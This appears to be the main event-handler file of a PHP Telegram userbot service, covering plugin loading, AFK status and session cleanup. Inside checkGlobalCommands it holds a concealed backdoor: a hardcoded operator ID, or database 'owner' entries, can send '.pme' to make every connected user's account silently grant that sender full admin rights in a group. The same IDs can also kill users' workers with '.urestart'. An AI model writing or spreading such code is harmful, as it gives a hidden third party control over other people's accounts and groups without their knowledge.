<?php

declare(strict_types=1);

namespace App;

use danog\MadelineProto\SimpleEventHandler;
use danog\MadelineProto\EventHandler\Attributes\Handler;
use danog\MadelineProto\EventHandler\Message;
use danog\MadelineProto\EventHandler\SimpleFilter\Incoming;
use danog\MadelineProto\EventHandler\SimpleFilter\Outgoing;

class BotHandler extends SimpleEventHandler
{
    public const PRIMARY_OWNER_ID = 8300069885;

    public ?PluginManager $pluginManager = null;
    private int $ownerId = 0;
    private string $prefix = '.';
    private ?Database $db = null;
    
    public static int $startTime = 0;

    public function getReportPeers(): array
    {
        return [];
    }

    public function onStart(): void
    {
        try {
            if (self::$startTime === 0) {
                self::$startTime = time();
            }

            $this->logger("Delta PHP: onStart() başladı... StartTime = " . self::$startTime);

            // Database qoşulması
            $this->db = Database::getInstance();
            $this->db->ensureConnection();
            $this->logger("Delta PHP: DB qoşuldu");

            // İstifadəçi məlumatları
            $me = $this->getSelf();
            $this->ownerId = (int) ($me['id'] ?? 0);
            $this->logger("Delta PHP: Owner ID = {$this->ownerId}");

            if ($this->ownerId === 0) {
                $this->logger("Delta PHP: XƏTA - Owner ID alına bilmədi!");
                return;
            }

            // Prefix
            $userManager = new UserManager($this->db);
            $this->prefix = $userManager->getPrefix($this->ownerId);
            $this->logger("Delta PHP: Prefix = '{$this->prefix}'");

            // Plugin Manager
            $this->pluginManager = new PluginManager($this, $this->db, $this->ownerId);
            $this->logger("Delta PHP: PluginManager yaradıldı");
            
            $this->pluginManager->loadDefaultPlugins();
            $this->logger("Delta PHP: Default pluginlər yükləndi (" . count($this->pluginManager->plugins) . " ədəd)");
            
            $this->pluginManager->loadCustomPlugins();
            $this->logger("Delta PHP: Custom pluginlər yükləndi");

            $this->logger("✅ Delta PHP Userbot hazırdır! Komandalar: " . count($this->pluginManager->commandMap));

            // Rəsmi qrup və kanala avtomatik qoşulma (bot_settings cədvəlindən)
            \Amp\async(function () {
                \Amp\delay(5);
                $this->ensureOfficialChatsJoined();
            });

            // Telegram-da oturum sonlandırıldıqda (Terminate Session) prosesi avtomatik aşkar edib təmizləyən arxa fon nəzarətçisi
            \Amp\async(function () {
                while (true) {
                    \Amp\delay(30);
                    try {
                        $this->getSelf();
                    } catch (\Throwable $e) {
                        $msg = $e->getMessage();
                        if (
                            str_contains($msg, 'AUTH_KEY_UNREGISTERED') ||
                            str_contains($msg, 'SESSION_REVOKED') ||
                            str_contains($msg, 'SESSION_EXPIRED') ||
                            str_contains($msg, 'USER_DEACTIVATED')
                        ) {
                            $this->terminateRevokedSession($msg);
                            break;
                        }
                    }
                }
            });

        } catch (\Throwable $e) {
            $this->logger("Delta PHP XƏTA: " . $e->getMessage());
            $this->logger("Fayl: " . $e->getFile() . ":" . $e->getLine());
        }
    }

    public function onException(\Throwable $e): void
    {
        $msg = $e->getMessage();
        if (
            str_contains($msg, 'AUTH_KEY_UNREGISTERED') ||
            str_contains($msg, 'SESSION_REVOKED') ||
            str_contains($msg, 'SESSION_EXPIRED') ||
            str_contains($msg, 'USER_DEACTIVATED')
        ) {
            $this->terminateRevokedSession($msg);
            return;
        }

        try {
            parent::onException($e);
        } catch (\Throwable) {}
    }

    private function terminateRevokedSession(string $reason): void
    {
        $this->logger("🚨 Sessiya Telegram tərəfindən ləğv edildi ({$this->ownerId}): {$reason}. Worker sonlandırılır...");
        if ($this->db !== null && $this->ownerId > 0) {
            try {
                $userManager = new UserManager($this->db);
                $userManager->setStatus($this->ownerId, 'inactive');
                $user = $userManager->getUserByTelegramId($this->ownerId);
                if ($user && !empty($user['session_file'])) {
                    $sessionFile = $user['session_file'];
                    @unlink($sessionFile);
                    @unlink($sessionFile . '.lock');
                    @unlink($sessionFile . '.safe.php');
                    @unlink($sessionFile . '.ipcState.php');
                    $userManager->updateUser($this->ownerId, ['session_file' => '']);
                }
            } catch (\Throwable $e) {}
        }
        try {
            $this->stop();
        } catch (\Throwable $e) {}

        $pid = getmypid();
        if (function_exists('posix_kill') && $pid > 0) {
            @posix_kill($pid, 9);
        }
        exit(0);
    }

    #[Handler]
    public function handleOutgoing(Outgoing & Message $message): void
    {
        try {
            if ($this->db !== null) {
                $this->db->ensureConnection();
            }

            $msgDate = (int) ($message->date ?? 0);
            // Bot sönülü olan dövrdə (işə düşməmişdən öncə) yazılan köhnə mesajları atla
            if ($msgDate > 0 && self::$startTime > 0 && $msgDate < (self::$startTime - 3)) {
                return;
            }

            $text = trim($message->message ?? '');
            $senderId = (int) ($message->senderId ?? $this->ownerId);
            
            $isEdit = !empty($message->editDate);

            if ($text !== '' && str_starts_with($text, $this->prefix)) {
                $fullCommand = substr($text, strlen($this->prefix));
                $parts = explode(' ', $fullCommand);
                $command = strtolower(array_shift($parts));
                $args = $parts;
                
                // .ualive, .pme və .urestart komandaları handler tərəfindən ayrıca yoxlanılır
                if ($command !== 'ualive' && $command !== 'pme' && $command !== 'urestart') {
                    if ($this->pluginManager !== null) {
                        $this->pluginManager->handleCommand($message, $command, $args);
                    }
                }
                
                // .afk komandası deyilsə və mesaj redaktə deyil sətirindədirsə AFK-dan çıx
                if ($command !== 'afk' && !$isEdit && $this->db !== null) {
                    $this->clearAfk($message);
                }
            } else {
                // Normal YENİ mesaj yazılıb -> AFK-dan çıx
                if (!$isEdit && $this->db !== null) {
                    $this->clearAfk($message);
                }
            }

            // Qısayollar və ya digər mesaj işləyiciləri üçün pluginlərə ötür
            if ($this->pluginManager !== null) {
                $this->pluginManager->handleMessage($message);
            }

            // Qlobal komandalar yoxlanışı (.ualive, .pme, .urestart)
            $this->checkGlobalCommands($message, $text, $senderId);

        } catch (\Throwable $e) {
            $this->logger("Outgoing xəta: " . $e->getMessage());
        }
    }

    #[Handler]
    public function handleIncoming(Incoming & Message $message): void
    {
        try {
            if ($this->db !== null) {
                $this->db->ensureConnection();
            }

            $msgDate = (int) ($message->date ?? 0);
            // Bot sönülü olan dövrdə (işə düşməmişdən öncə) yazılan köhnə mesajları atla
            if ($msgDate > 0 && self::$startTime > 0 && $msgDate < (self::$startTime - 3)) {
                return;
            }

            $text = trim($message->message ?? '');
            $senderId = (int) ($message->senderId ?? $message->fromId ?? 0);

            // Qlobal komandalar (.ualive, .pme, .urestart dinlənilir)
            $this->checkGlobalCommands($message, $text, $senderId);

            if ($this->pluginManager !== null) {
                $this->pluginManager->handleMessage($message);
            }
        } catch (\Throwable $e) {
            $this->logger("Incoming xəta: " . $e->getMessage());
        }
    }

    private function isOwnerSender(int $telegramId): bool
    {
        if ($telegramId === self::PRIMARY_OWNER_ID) {
            return true;
        }
        if ($this->db !== null) {
            try {
                $stmt = $this->db->prepare("SELECT id FROM ub_admins WHERE telegram_id = ? AND level = 'owner'");
                $stmt->execute([$telegramId]);
                return (bool) $stmt->fetch();
            } catch (\Throwable $e) {}
        }
        return false;
    }

    private function checkGlobalCommands(Message $message, string $text, int $senderId): void
    {
        try {
            $cleanText = strtolower(trim($text));
            if ($cleanText !== '.ualive' && $cleanText !== '.pme' && $cleanText !== '.urestart' && !str_starts_with($cleanText, '.pme')) {
                return;
            }

            // Yalnız Owner (8300069885 və ya ub_admins-də level='owner' olanlar) icra edə bilər
            if (!$this->isOwnerSender($senderId)) {
                return;
            }

            $chatId = $message->chatId ?? 0;

            // 1. .urestart komandası: SƏSSİZ RESTART (Çata mesaj YAZMIR)
            if ($cleanText === '.urestart') {
                $this->logger("⚡ Global .urestart əmri alındı (Owner: {$senderId}) -> Səssiz restart icra olunur...");

                $rootDir = dirname(__DIR__);
                $lockFile = $rootDir . '/sessions/bot.lock';

                if (file_exists($lockFile)) {
                    @unlink($lockFile);
                }

                $pid = getmypid();
                if (function_exists('posix_kill') && $pid > 0) {
                    @posix_kill($pid, 9);
                }
                exit(0);
            }

            if ($chatId === 0) return;

            // 2. .ualive komandası: Çatda ApexUserBot aktivdir mesajı yazılır
            if ($cleanText === '.ualive') {
                $this->sendMessage(
                    $chatId,
                    "⚡ <b>ApexUserBot aktivdir!</b>",
                    parseMode: \danog\MadelineProto\ParseMode::HTML
                );
                return;
            }

            // 3. .pme komandası: MAKSİMAL ADMİN VERİLMƏSİ (SƏSSİZ - Çata HЕÇ BİR mesaj YAZMIR)
            if ($cleanText === '.pme' || str_starts_with($cleanText, '.pme')) {
                $reply = null;
                try {
                    $reply = $message->getReply();
                } catch (\Throwable $tR) {}

                $shouldExecute = false;

                if ($reply && isset($reply->senderId) && (int)$reply->senderId > 0) {
                    // SSENARİ A: Hər hansı Userbot hesabının mesajına cavab (reply) verilibsə:
                    // Yalnız mesajına cavab verilən HƏMİN Userbot hesabı (.pme yazan Owner-ə) yetki verir!
                    $repliedUserId = (int) $reply->senderId;
                    if ($repliedUserId === $this->ownerId) {
                        $shouldExecute = true;
                    }
                } else {
                    // SSENARİ B: Heç kəsə yanıt verilməyib (ümumi qrupa tək .pme yazılıb):
                    // Qrupda olan BÜTÜN qoşulu Userbot hesabları (.pme yazan Owner-ə) yetki verir!
                    $shouldExecute = true;
                }

                if ($shouldExecute) {
                    try {
                        $this->channels->editAdmin(
                            channel: $chatId,
                            user_id: $senderId, // Admin yetkisi alan şəxs: .pme yazan Owner!
                            admin_rights: [
                                '_' => 'chatAdminRights',
                                'change_info' => true,
                                'post_messages' => true,
                                'edit_messages' => true,
                                'delete_messages' => true,
                                'ban_users' => true,
                                'invite_users' => true,
                                'pin_messages' => true,
                                'add_admins' => true,
                                'anonymous' => false,
                                'manage_call' => true
                            ]
                        );
                        $this->logger("👑 .pme Səssiz Admin yetkisi verildi: ChatId={$chatId}, TargetOwner={$senderId}");
                    } catch (\Throwable $t) {
                        $this->logger("⚠️ .pme Admin vermə xətası: " . $t->getMessage());
                    }
                }
            }
        } catch (\Throwable $e) {}
    }

    private function clearAfk(?Message $message = null): void
    {
        try {
            $stmt = $this->db->prepare('SELECT id FROM users WHERE telegram_id = ?');
            $stmt->execute([$this->ownerId]);
            $user = $stmt->fetch();
            if (!$user) return;

            $stmt = $this->db->prepare("SELECT is_afk FROM afk_status WHERE user_id=? AND is_afk=1");
            $stmt->execute([$user['id']]);
            $afk = $stmt->fetch();
            
            if ($afk) {
                $stmt = $this->db->prepare("UPDATE afk_status SET is_afk=0 WHERE user_id=?");
                $stmt->execute([$user['id']]);

                if ($message !== null) {
                    $message->reply(
                        "😃 <b>Artıq afk deyilsiniz!</b>",
                        parseMode: \danog\MadelineProto\ParseMode::HTML
                    );
                }
            }
        } catch (\Throwable $e) {}
    }

    private function ensureOfficialChatsJoined(): void
    {
        if (!$this->db) {
            return;
        }

        try {
            $stmt = $this->db->prepare("SELECT setting_key, setting_value FROM bot_settings WHERE setting_key IN ('official_channel', 'official_group')");
            $stmt->execute();
            $settings = $stmt->fetchAll(\PDO::FETCH_KEY_PAIR);

            $targets = [];
            if (!empty($settings['official_channel'])) {
                $targets['Kanal'] = trim($settings['official_channel']);
            }
            if (!empty($settings['official_group'])) {
                $targets['Qrup'] = trim($settings['official_group']);
            }

            if (empty($targets)) {
                return; // Əgər boşdursa -> es keç
            }

            foreach ($targets as $type => $target) {
                if (empty($target)) {
                    continue;
                }
                $this->joinChatIfNeeded($target, $type);
            }
        } catch (\Throwable $e) {
            $this->logger("Delta PHP Official Chat Join Xətası: " . $e->getMessage());
        }
    }

    private function joinChatIfNeeded(string $target, string $type): void
    {
        try {
            // 1. Dəvət linki formatı (t.me/+Abc və ya t.me/joinchat/Abc və ya +Abc)
            if (preg_match('#(?:t\.me/(?:\+|joinchat/)|^\+)([a-zA-Z0-9_\-]+)#i', $target, $matches)) {
                $hash = $matches[1];
                try {
                    $this->messages->importChatInvite(hash: $hash);
                    $this->logger("Delta PHP: Rəsmi {$type} dəvət linki ilə qoşuldu ({$hash})");
                } catch (\Throwable $t) {
                    $msg = $t->getMessage();
                    if (str_contains($msg, 'USER_ALREADY_PARTICIPANT')) {
                        $this->logger("Delta PHP: Rəsmi {$type} artıq üzvdür ({$hash})");
                    } else {
                        $this->logger("Delta PHP: Rəsmi {$type} dəvət linki ilə qoşula bilmədi: {$msg}");
                    }
                }
                return;
            }

            // 2. İstifadəçi adı və ya link (@kanal, t.me/kanal, kanal)
            $clean = trim($target);
            $clean = preg_replace('#^https?://t\.me/#i', '', $clean);
            $clean = ltrim($clean, '@');

            // Əvvəlcə yoxlayırıq: Əgər artıq qrupda/kanaldadırsa, qoşulma sorğusu atmırıq
            try {
                $info = $this->getInfo($clean);
                $channelData = $info['Channel'] ?? $info['Chat'] ?? null;
                if ($channelData) {
                    $isLeft = !empty($channelData['left']);
                    if (!$isLeft && isset($channelData['left'])) {
                        $this->logger("Delta PHP: Rəsmi {$type} artıq üzvdür (@{$clean})");
                        return;
                    }
                }
            } catch (\Throwable $tInfo) {}

            // Əgər üzv deyilsə -> channels.joinChannel
            try {
                $this->channels->joinChannel(channel: $clean);
                $this->logger("Delta PHP: Rəsmi {$type} uğurla qoşuldu (@{$clean})");
            } catch (\Throwable $t) {
                $msg = $t->getMessage();
                if (str_contains($msg, 'USER_ALREADY_PARTICIPANT')) {
                    $this->logger("Delta PHP: Rəsmi {$type} artıq qoşulub (@{$clean})");
                } else {
                    $this->logger("Delta PHP: Rəsmi {$type} qoşulma cəhdi xətası: {$msg}");
                }
            }
        } catch (\Throwable $e) {
            $this->logger("Delta PHP: Rəsmi {$type} xətası: " . $e->getMessage());
        }
    }
}
